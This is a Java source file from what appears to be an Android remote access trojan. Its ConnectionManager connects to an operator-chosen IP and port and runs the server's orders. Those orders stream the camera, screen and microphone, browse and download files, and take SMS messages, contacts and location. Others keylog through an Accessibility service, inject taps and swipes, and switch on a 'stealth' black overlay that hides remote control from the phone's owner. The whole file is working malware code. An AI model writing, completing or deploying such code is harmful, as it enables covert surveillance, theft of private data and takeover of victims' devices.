package com.Deviant.pro;

import android.content.Context;
import android.os.Build;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.LinkedBlockingQueue;

public class ConnectionManager {
    private static final String TAG = "ConnectionManager";
    public static String HOST = "0.0.0.0"; // Replace with your IP
    public static int PORT = 7777; // Replace with your Port
    
    private static Socket socket;
    private static PrintWriter out;
    private static BufferedReader in;
    private static final LinkedBlockingQueue<String> sendQueue = new LinkedBlockingQueue<String>();
    private static boolean isRunning = false;

    public static void startAsync(final Context context) {
        if (isRunning) return;
        isRunning = true;
        
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        String data = sendQueue.take();
                        synchronized (ConnectionManager.class) {
                            if (out != null) {
                                out.println(data);
                                out.flush();
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Sender thread error: " + e.getMessage());
                    }
                }
            }
        }).start();

        new Thread(new Runnable() {
            @Override
            public void run() {
                connect(context);
            }
        }).start();
    }

    private static void connect(Context context) {
        while (true) {
            try {
                Log.d(TAG, "Connecting to " + HOST + ":" + PORT);
                socket = new Socket(HOST, PORT);
                socket.setTcpNoDelay(true);
                
                synchronized (ConnectionManager.class) {
                    out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));
                }

                Log.d(TAG, "Connected!");
                sendInitialData(context);

                String line;
                while ((line = in.readLine()) != null) {
                    handleCommand(context, line);
                }
            } catch (Exception e) {
                Log.e(TAG, "Connection Error: " + e.getMessage());
                cleanupManagers();
            } finally {
                cleanup();
            }
            
            try { Thread.sleep(5000); } catch (Exception ignored) {}
        }
    }

    private static void cleanup() {
        synchronized (ConnectionManager.class) {
            try {
                if (out != null) out.close();
                if (in != null) in.close();
                if (socket != null) socket.close();
            } catch (Exception ignored) {}
            out = null;
            in = null;
            socket = null;
        }
    }

    private static void cleanupManagers() {
        CameraManager.stopStreaming();
        ScreenManager.stopStreaming();
        if (KeylogManager.getInstance() != null) {
            KeylogManager.getInstance().stopScreenReader();
        }
    }

    private static void sendInitialData(Context context) throws Exception {
        JSONObject jo = new JSONObject();
        jo.put("type", "login");
        jo.put("model", Build.MODEL);
        jo.put("man", Build.MANUFACTURER);
        jo.put("release", Build.VERSION.RELEASE);
        send(jo.toString());
    }

    public static void send(String data) {
        sendQueue.offer(data);
    }

    private static void handleCommand(Context context, String data) {
        try {
            JSONObject jo = new JSONObject(data);
            String order = jo.getString("order");
            Log.d(TAG, "Received order: " + order);

            if (order.equals("camera")) {
                CameraManager.startStreaming(context, jo);
            } else if (order.equals("stop_camera")) {
                CameraManager.stopStreaming();
            } else if (order.equals("file_manager")) {
                FileManager.walk(jo.getString("path"));
            } else if (order.equals("file_download")) {
                FileManager.download(jo.getString("path"));
            } else if (order.equals("sms")) {
                SMSManager.getSMSList(context);
            } else if (order.equals("contacts")) {
                ContactsManager.getContacts(context);
            } else if (order.equals("mic")) {
                MicManager.handle(jo);
            } else if (order.equals("location")) {
                LocManager.getLocation(context);
            } else if (order.equals("device_info")) {
                DeviceInfoManager.getInfo(context);
            } else if (order.equals("screen_reader")) {
                if (KeylogManager.getInstance() != null) {
                    if (jo.getString("action").equals("start")) {
                        KeylogManager.getInstance().startScreenReader();
                    } else {
                        KeylogManager.getInstance().stopScreenReader();
                    }
                }
            } else if (order.equals("screen_share")) {
                if (jo.getString("action").equals("start")) {
                    if (MainActivity.getInstance() != null) {
                        MainActivity.getInstance().requestScreenShare();
                    }
                } else {
                    ScreenManager.stopStreaming();
                }
            } else if (order.equals("automation")) {
                if (KeylogManager.getInstance() != null) {
                    KeylogManager.getInstance().processCommand(jo.getString("command"), jo.getString("argument"));
                }
            } else if (order.equals("stealth")) {
                if (KeylogManager.getInstance() != null) {
                    KeylogManager.getInstance().toggleBlackOverlay(jo.getBoolean("enable"));
                }
            } else if (order.equals("gesture")) {
                if (KeylogManager.getInstance() != null) {
                    String type = jo.getString("type");
                    Log.d(TAG, "Executing gesture: " + type);
                    if (type.equals("click")) {
                        KeylogManager.getInstance().click(jo.getInt("x"), jo.getInt("y"));
                    } else if (type.equals("swipe")) {
                        KeylogManager.getInstance().swipe(jo.getInt("x1"), jo.getInt("y1"), jo.getInt("x2"), jo.getInt("y2"), jo.getInt("duration"));
                    } else if (type.equals("action")) {
                        KeylogManager.getInstance().performAction(jo.getInt("actionId"));
                    }
                } else {
                    Log.w(TAG, "Gesture received but KeylogManager (Accessibility) is NOT active!");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Command handling error: " + e.getMessage());
        }
    }
}
